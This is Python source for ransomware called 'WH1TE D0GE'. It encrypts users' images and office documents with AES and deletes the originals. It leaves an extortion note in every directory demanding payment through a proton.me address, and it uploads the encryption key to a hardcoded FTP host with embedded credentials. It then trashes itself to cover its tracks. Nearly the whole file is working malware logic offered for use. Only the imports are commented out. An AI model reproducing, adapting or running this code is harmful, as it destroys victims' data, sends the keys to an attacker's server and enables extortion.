import pathlib
import sys

# from Crypto.Cipher import AES
# from Crypto.Random import get_random_bytes
# from Crypto.Util.Padding import pad
# from ftplib import FTP
# from tqdm import tqdm
# from send2trash import send2trash

from typing import List, Generator

DECRYPTION_DATA = "decryption-data"
DOMAIN = "files.support-desk.info"
USER = "operator"
PASSWORD = "d0ge_dOg_getTing_riCHy_r1ch"


class Encryptor:
    EXTENSION = ".DOGEDOG"
    ENCRYPTED_EXTENSIONS = {".png", ".jpeg", ".jpg", ".bmp", ".pdf", ".xlsx", ".docx", ".pptx"}
    KEY_SIZE = 16
    IV_SIZE = 16

    def __init__(self) -> None:
        self._key = get_random_bytes(self.KEY_SIZE)
        self._iv = get_random_bytes(self.IV_SIZE)

    def encrypt(self, paths: List[str]) -> None:
        for path in paths:
            self._write_ransom_note(pathlib.Path(path))
            for file in tqdm(self._recurse_dirs(pathlib.Path(path))):
                cipher = AES.new(self._key, AES.MODE_CBC, iv=self._iv)
                encrypted_file_path = file.parent / (file.name + self.EXTENSION)
                encrypted_data = cipher.encrypt(pad(file.read_bytes(), Encryptor.KEY_SIZE))
                encrypted_file_path.write_bytes(encrypted_data)
                file.unlink()
        self._send_encryption_data()

    def _recurse_dirs(self, path_to_encrypt: pathlib.Path) -> Generator[pathlib.Path, None, None]:
        for file in path_to_encrypt.glob("**/*"):
            if file.is_dir():
                self._write_ransom_note(file)
            if file.suffix in self.ENCRYPTED_EXTENSIONS:
                yield file

    def _send_encryption_data(self):
        try:
            with FTP(DOMAIN) as ftp:
                ftp.login(USER, PASSWORD)
                ftp.cwd('data')
                temp = pathlib.Path("tmp")
                temp.write_bytes(self._iv + self._key)
                ftp.storbinary(f"STOR {DECRYPTION_DATA}", temp.open("rb"))
                temp.unlink()
        except ConnectionError as e:
            print(e)

    def _write_ransom_note(self, directory: pathlib.Path):
        text = """
[~~~~~~~~~~~~~~~~~~~~~ WH1TE D0GE ~~~~~~~~~~~~~~~~~~~~~]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡟⠛⠉⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⡖⠫⠀⠨⢉⠲⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠏⠁⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⡞⠀⣠⣄⠀⠀⠑⢦⠹⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠐⠀⠀⠀⡄⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡼⢠⠀⠈⠛⠀⠀⠀⠀⠀⢌⡳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠫⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡇⠈⠀⠐⠀⠀⠀⠀⠀⠘⣆⠙⢎⠳⢄⣀⠀⢀⣀⣀⣀⣀⣀⣀⢤⠤⢒⣋⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⢀⣂⠈⠀⠀⠀⠀⠙⣦⠀⠙⠲⠼⠿⠍⠒⠂⠒⠒⠒⠒⠓⠉⠉⠀⠀⠀⠀⠀⠀⠀⠻⠆⣆⢧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⢉⣻⣷⡆⠇⠀⠀⠘⡷⠄⣀⡼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠻⠶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢷⢤⠘⠆⠈⢿⣿⣿⣦⠀⠀⠀⠀⡼⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⠦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠸⡜⣆⠀⠀⠈⢿⣿⣿⣷⣄⠈⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣰⠃⠙⢷⣦⠀⠀⠙⠿⠏⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡴⠃⠀⠀⢐⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣆⣴⣶⣶⣦⠀⠀⠀⠀⠀⠀⠘⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⢅⠀⠀⠨⣤⡦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⡏⣇⠀⠀⠀⠀⡀⠀⢺⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⠸⠀⠀⢴⡙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣥⣿⣿⣿⣿⠻⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣾⡧⠇⠀⠒⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⠆⣸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠳⠀⠀⠀⠀⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠏⠹⠞⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠐⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⡾⡔⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠔⠒⣈⣉⣓⣢⡄⠀⠀⠀⠀⠀⢹⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣼⡝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣾⠑⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣵⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀
⠀⠀⢸⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢻⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠂⠀⢷⠀⠀⠀⠀⠀⠀
⠀⢀⣟⡂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠂⠆⠀⢠⣨⠿⠛⣻⠃⠀⠀⠀⠀⠀⠀⠀⠀⣸⠀⠀⠀⠀⠀⠀
⠀⣸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠈⣃⣶⣴⣾⣿⣿⣿⢟⣦⠀⠀⠳⠄⠀⠀⣿⠀⠀⠀⠀⠀⠀
⠀⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⢾⣶⣶⣶⣤⣶⣾⣿⣿⣿⣿⣿⡟⠋⠀⠁⠀⠀⠀⠀⠀⢰⠇⠀⠀⠀⠀⠀⠀
⢰⢡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠀⠙⠛⠋⠉⠈⠁⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⡏⠀⠀⠀⠀⠀⠀⠀
⣸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠁⠀⠀⠀⠀⠀⠀⠀
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀
⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡇⠀⠀⠀⠀⠀⠀⠀
⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣇⠀⠀⠀⠀⠀⠀⠀
⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡀⠀⠀⠀⠀⠀⠀
[~~~~~~~~~~~~~~~~~~~~~ WH1TE D0GE ~~~~~~~~~~~~~~~~~~~~~]

# WHAT HAPPENDED?

We did a pentest for your company and the security of
your company has some room for improvements. Your
sensitive data has been encrypted and copied to our
servers.

The encrypted files have the .DOGEDOG extension. There
is no way to recover these files without our decryptor!


# WHAT HAPPENS NOW?

You have to pay us for our pentest to get the decryptor
for your files. Please contact us via e-mail to get
further instructions: d0ged0g@proton.me


# CAUTION

Do not modify the encrypted files!
Do not use third party software to decrypt the data!
Any change to the encrypted files will result in
permanent data loss!

"""
        path = directory / "IMPORTANT_NOTE_README.txt"
        try:
            path.write_text(text, encoding="utf-8")
        except PermissionError as e:
            print(e)
            print(f"Cannot write ransom note to {directory}")


if __name__ == '__main__':
    if len(sys.argv) >= 2:
        paths = sys.argv[1:]
        Encryptor().encrypt(paths)
        script_file = pathlib.Path(__file__).absolute()
        print(script_file)
        send2trash(script_file)
    else:
        print("Ooops, it did not work...")
        print("Not enough arguments, provide directory name(s) to encrypt")

